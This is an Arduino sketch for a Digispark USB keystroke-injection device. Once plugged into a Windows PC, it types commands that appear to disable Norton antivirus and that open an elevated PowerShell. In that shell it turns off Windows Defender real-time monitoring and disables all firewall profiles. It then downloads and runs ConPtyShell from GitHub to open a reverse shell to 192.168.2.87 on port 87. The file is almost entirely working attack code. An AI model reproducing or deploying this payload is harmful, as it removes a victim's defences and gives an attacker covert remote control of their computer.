
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(41, MOD_CONTROL_LEFT); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("norton");//start cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.sendKeyStroke(79, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(81, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(81, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(81, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(81, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(41, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");//start cmd");
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("netsh advfirewall set allprofiles state off");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.print ("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.2.87 87");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
